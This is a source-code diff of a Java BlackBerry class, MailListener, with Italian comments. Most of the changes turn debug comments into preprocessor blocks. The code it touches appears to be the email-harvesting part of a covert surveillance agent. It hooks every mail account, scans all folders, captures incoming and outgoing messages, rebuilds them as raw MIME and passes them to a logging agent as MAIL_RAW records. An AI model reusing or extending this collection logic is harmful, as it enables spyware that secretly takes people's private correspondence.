@@ -1,3 +1,4 @@
+//#preprocess
 /**
  * 
  */
@@ -58,8 +59,10 @@ import blackberry.utils.WChar;
 public final class MailListener implements FolderListener, StoreListener,
         SendListener {
 
-    // #debug
+    //#ifdef DEBUG
     static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);
+
+    //#endif
 
     private static final int MAIL_VERSION = 2009070301;
 
@@ -71,7 +74,7 @@ public final class MailListener implements FolderListener, StoreListener,
     private static ServiceRecord[] mailServiceRecords;
     Filter realtimeFilter;
     Filter collectFilter;
-    
+
     Random random = new Random();
 
     /**
@@ -97,8 +100,9 @@ public final class MailListener implements FolderListener, StoreListener,
      * .blackberry.api.mail.event.StoreEvent)
      */
     public void batchOperation(final StoreEvent arg0) {
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("batchOperation: " + arg0);
+        //#endif
 
     }
 
@@ -111,20 +115,25 @@ public final class MailListener implements FolderListener, StoreListener,
     public synchronized void messagesAdded(final FolderEvent folderEvent) {
         final Message message = folderEvent.getMessage();
 
-        // #debug info
-        debug.info("Added Message: " + message + " folderEvent: "+ folderEvent);
+        //#ifdef DEBUG_INFO
+        debug
+                .info("Added Message: " + message + " folderEvent: "
+                        + folderEvent);
+        //#endif
 
         if (collecting) {
-            //#debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("messagesAdded: ignoring, still collecting");
+            //#endif
             return;
         }
 
         try {
             int type = folderEvent.getType();
             if (type != FolderEvent.MESSAGE_ADDED) {
-                //#debug info
+                //#ifdef DEBUG_INFO
                 debug.info("filterMessage: FILTERED_MESSAGE_ADDED");
+                //#endif
                 return;
             }
 
@@ -132,17 +141,18 @@ public final class MailListener implements FolderListener, StoreListener,
                     messageAgent.lastcheck);
             if (filtered == Filter.FILTERED_OK) {
                 boolean ret = saveLog(message, realtimeFilter.maxMessageSize);
-                //#mdebug
-                if(ret){
-                //#debug debug
-                debug.trace("messagesAdded: " + message.getFolder().getName());
+                //#ifdef DEBUG
+                if (ret) {
+                    debug.trace("messagesAdded: "
+                            + message.getFolder().getName());
                 }
-                //#enddebug
+                //#endif
             }
 
         } catch (final MessagingException ex) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("cannot manage added message: " + ex);
+            //#endif
         }
 
         messageAgent.updateMarkup();
@@ -156,8 +166,9 @@ public final class MailListener implements FolderListener, StoreListener,
      */
     public void messagesRemoved(final FolderEvent e) {
         final Message message = e.getMessage();
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("Removed Message" + message);
+        //#endif
 
     }
 
@@ -177,8 +188,9 @@ public final class MailListener implements FolderListener, StoreListener,
      * Run.
      */
     public void run() {
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("run");
+        //#endif
 
         final long timestamp = messageAgent.initMarkup();
 
@@ -186,8 +198,9 @@ public final class MailListener implements FolderListener, StoreListener,
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
             names[count] = mailServiceRecords[count].getName();
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Nome dell'account di posta: " + names[count]);
+            //#endif
 
             names[count] = mailServiceRecords[0].getName();
             final ServiceConfiguration sc = new ServiceConfiguration(
@@ -198,8 +211,9 @@ public final class MailListener implements FolderListener, StoreListener,
             // Scandisco ogni Folder dell'account di posta
             scanFolders(folders);
         }
-        // #debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("Fine ricerca!!");
+        //#endif
 
         collecting = false;
         messageAgent.updateMarkup();
@@ -208,8 +222,9 @@ public final class MailListener implements FolderListener, StoreListener,
     private synchronized boolean saveLog(final Message message,
             final long maxMessageSize) {
 
-        //#debug debug
+        //#ifdef DEBUG_TRACE
         debug.trace("saveLog: " + message);
+        //#endif
 
         ByteArrayOutputStream os = null;
         try {
@@ -231,15 +246,19 @@ public final class MailListener implements FolderListener, StoreListener,
             //#ifdef DBC
             Check.ensures(additionalData.length == 20, "Wrong buffer size");
             //#endif
-            
-            //#debug debug
+
+            //#ifdef DEBUG_TRACE
             debug.trace("saveLog: " + mail);
 
-            messageAgent.createLog(additionalData, mail.getBytes(), LogType.MAIL_RAW);
+            //#endif
+
+            messageAgent.createLog(additionalData, mail.getBytes(),
+                    LogType.MAIL_RAW);
 
         } catch (final Exception ex) {
-            //#debug error
+            //#ifdef DEBUG_ERROR
             debug.error("saveLog message: " + ex);
+            //#endif
             return false;
 
         } finally {
@@ -250,7 +269,7 @@ public final class MailListener implements FolderListener, StoreListener,
                 }
             }
         }
-        
+
         return true;
     }
 
@@ -270,11 +289,13 @@ public final class MailListener implements FolderListener, StoreListener,
         for (int count = 0; count < subfolders.length; count++) {
 
             Folder folder = subfolders[count];
-            // #debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("Folder name: " + folder.getFullName());
+            //#endif
 
-            //#debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("scanFolders getName: " + folder.getName());
+            //#endif
 
             dirs = folder.list();
             scanFolders(dirs);
@@ -283,12 +304,14 @@ public final class MailListener implements FolderListener, StoreListener,
                 // Scandisco ogni e-mail dell'account di posta
                 for (int j = 0; j < messages.length; j++) {
                     try {
-                        //#debug debug
+                        //#ifdef DEBUG_TRACE
                         debug.trace("message # " + j);
+                        //#endif
 
                         if (j == 6) {
-                            //#debug debug
+                            //#ifdef DEBUG_TRACE
                             debug.trace("STOP # " + j);
+                            //#endif
                         }
 
                         final Message message = messages[j];
@@ -307,19 +330,21 @@ public final class MailListener implements FolderListener, StoreListener,
                             break;
                         }
                     } catch (Exception ex) {
-                        //#debug error
+                        //#ifdef DEBUG_ERROR
                         debug.error("message # " + j + " ex:" + ex);
+                        //#endif
                     }
 
                 }
             } catch (final MessagingException e) {
-                // #debug debug
+                //#ifdef DEBUG_TRACE
                 debug.trace("Folder#getMessages() threw " + e.toString());
+                //#endif
             } catch (final Exception ex) {
-                //#debug error
+                //#ifdef DEBUG_ERROR
                 debug.error("Scanning: " + ex);
-                //#debug error
-                debug.error("Folder: " + folder);
+                debug.error("Folder: " + folder); 
+                //#endif
             }
         }
     }
@@ -333,12 +358,14 @@ public final class MailListener implements FolderListener, StoreListener,
     public boolean sendMessage(final Message message) {
 
         // if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("New Send Message: " + message);
+        //#endif
 
         if (collecting) {
-            //#debug debug
+            //#ifdef DEBUG_TRACE
             debug.trace("sendMessage: ignoring, still collecting");
+            //#endif
             return true;
         }
 
@@ -348,13 +375,15 @@ public final class MailListener implements FolderListener, StoreListener,
             if (filtered == Filter.FILTERED_OK) {
                 //TODO: enable saveLog
                 //saveLog(message, realtimeFilter.maxMessageSize);
-                //#debug debug
+                //#ifdef DEBUG_TRACE
                 debug.trace("messagesAdded: " + message.getFolder().getName());
+                //#endif
             }
 
         } catch (final MessagingException ex) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("cannot manage send message: " + ex);
+            //#endif
             return true;
         }
 
@@ -373,16 +402,16 @@ public final class MailListener implements FolderListener, StoreListener,
         MailParser parser = new MailParser(message);
         Mail mail = parser.parse();
 
-        //#mdebug
+        //#ifdef DEBUG
         debug.trace("Dimensione dell'email: " + message.getSize() + "bytes");
         debug.trace("Data invio dell'email: " + message.getSentDate());
         debug.trace("Oggetto dell'email: " + message.getSubject());
-        //#enddebug
+        //#endif
 
         mailRaw.append("MIME-Version: 1.0\r\n");
         //1234567890123456789012345678
         long rnd = Math.abs(random.nextLong());
-        String boundary = "------_=_NextPart_"+rnd;
+        String boundary = "------_=_NextPart_" + rnd;
 
         if (mail.isMultipart()) {
             mailRaw.append("Content-Type: multipart/alternative; boundary="
@@ -426,8 +455,9 @@ public final class MailListener implements FolderListener, StoreListener,
                 mail.append(header.getValue());
                 mail.append("\r\n");
             } else {
-                //#debug error
+                //#ifdef DEBUG_ERROR
                 debug.error("Unknown header type: " + headerObj);
+                //#endif
             }
         }
     }
@@ -441,8 +471,10 @@ public final class MailListener implements FolderListener, StoreListener,
         mailServiceRecords = serviceBook.findRecordsByCid("CMIME");
 
         names = new String[mailServiceRecords.length];
-        // #debug debug
-        debug.trace("Ci sono: " + mailServiceRecords.length + " account di posta!");
+        //#ifdef DEBUG_TRACE
+        debug.trace("Ci sono: " + mailServiceRecords.length
+                + " account di posta!");
+        //#endif
 
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
